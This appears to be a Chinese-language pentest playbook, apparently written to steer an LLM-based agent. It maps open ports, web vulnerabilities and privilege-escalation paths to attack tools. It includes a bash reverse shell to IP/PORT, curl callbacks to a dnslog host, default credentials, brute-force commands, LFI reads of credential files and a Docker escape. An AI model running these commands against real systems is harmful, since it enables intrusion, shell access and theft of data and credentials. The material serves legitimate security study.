# 工具决策树（端口/漏洞/提权 → 工具自动路由）

## 2B. 工具决策树（自动化工具选择）

> 根据发现的端口/服务类型，自动路由到最佳工具链，减少 LLM 幻觉。

### 端口 → 工具路由

```
端口扫描结果 → 自动路由:
│
├── 80/443 (HTTP/HTTPS)
│   ├── CMS 探测 → whatweb / wappalyzer → 确认后:
│   │   ├── WordPress → wpscan --enumerate ap,at,u
│   │   ├── Joomla → joomscan
│   │   ├── Drupal → droopescan scan drupal
│   │   └── 未知 CMS → nuclei -t technologies/
│   ├── 目录枚举 → gobuster/dirsearch/ffuf -w common.txt
│   ├── 漏洞扫描 → nikto + nuclei -t cves/
│   ├── JS 分析 → katana -js-crawl / LinkFinder / gau
│   ├── API 发现 → ffuf -w api-wordlist / swagger-ui 探测
│   └── 参数发现 → arjun / x8 / burp param miner
│
├── 445 (SMB)
│   ├── 枚举 → enum4linux-ng / smbclient -L / crackmapexec smb
│   ├── 漏洞 → ms17-010 / printNightmare / smbghost check
│   └── 共享访问 → smbclient //target/share / mount -t cifs
│
├── 22 (SSH)
│   ├── 版本漏洞 → searchsploit OpenSSH <version>
│   ├── 用户名枚举 → 特定版本 CVE（如 CVE-2018-15473）
│   └── 已知凭据 → ssh / hydra -l user -P wordlist
│
├── 21 (FTP)
│   ├── 匿名登录 → ftp anonymous@target
│   ├── 版本漏洞 → searchsploit vsftpd/ProFTPD <version>
│   └── 暴力破解 → hydra -l user -P wordlist ftp://target
│
├── 3306 (MySQL) / 5432 (PostgreSQL) / 1433 (MSSQL)
│   ├── 弱密码 → hydra / default creds (root:root, sa:sa, postgres:postgres)
│   ├── 未授权 → mysql -h target -u root / psql -h target
│   └── UDF 提权 → (获取访问后) lib_mysqludf_sys
│
├── 6379 (Redis)
│   ├── 未授权 → redis-cli -h target INFO
│   ├── 写 webshell → config set dir / dbfilename
│   └── 主从复制 RCE → redis-rogue-server
│
├── 27017 (MongoDB)
│   ├── 未授权 → mongosh --host target / show dbs
│   └── 注入 → NoSQL injection if behind web app
│
├── 389/636 (LDAP)
│   ├── 匿名绑定 → ldapsearch -x -H ldap://target
│   └── AD 枚举 → bloodhound-python / ldapdomaindump
│
├── 88 (Kerberos)
│   ├── 用户枚举 → kerbrute userenum
│   ├── AS-REP Roasting → GetNPUsers.py
│   └── Kerberoasting → GetUserSPNs.py
│
├── 161 (SNMP)
│   ├── community string → onesixtyone / snmpwalk -c public
│   └── 信息枚举 → snmpwalk -v2c -c public target
│
├── 8080/8443/9090 (管理面板/中间件)
│   ├── 识别 → Tomcat/Jenkins/JBoss/WebLogic
│   ├── 默认凭据 → tomcat:tomcat / admin:admin
│   └── 已知 CVE → nuclei -t cves/ + searchsploit
│
└── 其他未知端口
    ├── 服务识别 → nmap -sV -sC -p<port> target
    ├── Banner 抓取 → nc -nv target <port>
    └── 搜索漏洞 → searchsploit <service> + nuclei
```

### Web 漏洞 → 工具路由

```
确认漏洞类型后 → 工具选择:
│
├── SQLi 确认
│   ├── 自动化 → sqlmap -u URL --forms --batch --risk=3 --level=5
│   ├── WAF 场景 → sqlmap --tamper=between,randomcase,space2comment
│   ├── 手工验证 → 根据 DB 类型选择 payload（参见 §7 SQLi First-Pass）
│   └── OOB 盲注 → sqlmap --dns-domain=your.dnslog.cn
│
├── XSS 确认
│   ├── 自动化 → dalfox url URL --mining-dict
│   ├── DOM XSS → dom-invader (Burp) / 手工 sink 追踪
│   └── CSP 绕过 → csp-evaluator.withgoogle.com 分析后针对性绕过
│
├── SSRF 确认
│   ├── 内网扫描 → 递归请求 127.0.0.1:1-65535 / 内网段
│   ├── 云元数据 → 169.254.169.254 / metadata.google.internal
│   └── 协议利用 → gopher:// / dict:// / file:///
│
├── LFI 确认
│   ├── 敏感文件 → /etc/passwd, /proc/self/environ, wp-config.php
│   ├── 日志包含 → /var/log/apache2/access.log + UA 注入
│   ├── PHP Wrapper → php://filter/convert.base64-encode/resource=
│   └── RCE 提升 → pearcmd / data:// / expect:// / zip://
│
├── Command Injection 确认
│   ├── 自动化 → commix -u URL --data="param=value"
│   ├── 反弹 shell → bash -i >& /dev/tcp/IP/PORT 0>&1
│   └── 盲注验证 → ping -c 3 your-server / curl http://your-dnslog
│
└── SSTI 确认
    ├── 引擎识别 → {{7*7}} vs ${7*7} vs <%= 7*7 %> 响应差异
    ├── 自动化 → tplmap -u URL -d "param=value"
    └── 手工 RCE → 根据引擎选择 payload（Jinja2/Twig/EJS/...）
```

### 提权 → 工具路由

```
获得 shell 后 → 提权路径:
│
├── Linux
│   ├── 自动枚举 → linpeas.sh / linux-exploit-suggester
│   ├── SUID → find / -perm -4000 2>/dev/null → GTFOBins
│   ├── sudo → sudo -l → GTFOBins / sudo exploit
│   ├── Cron → cat /etc/crontab + pspy 监控
│   ├── Capabilities → getcap -r / 2>/dev/null
│   ├── 内核漏洞 → uname -a → searchsploit linux kernel
│   └── Docker → id (docker group?) → docker run -v /:/mnt --rm -it alpine chroot /mnt
│
└── Windows
    ├── 自动枚举 → winpeas.exe / PowerUp.ps1 / Seatbelt
    ├── Token → whoami /priv → Potato 系列 (JuicyPotato/PrintSpoofer/GodPotato)
    ├── 服务 → sc query / accesschk → 服务路径劫持/DLL 劫持
    ├── 计划任务 → schtasks /query → 可写任务路径
    ├── AlwaysInstallElevated → reg query HKLM/.../Installer
    ├── 未打补丁 → systeminfo → windows-exploit-suggester
    └── AD 提权 → mimikatz / rubeus / SharpHound → BloodHound 分析
```

---
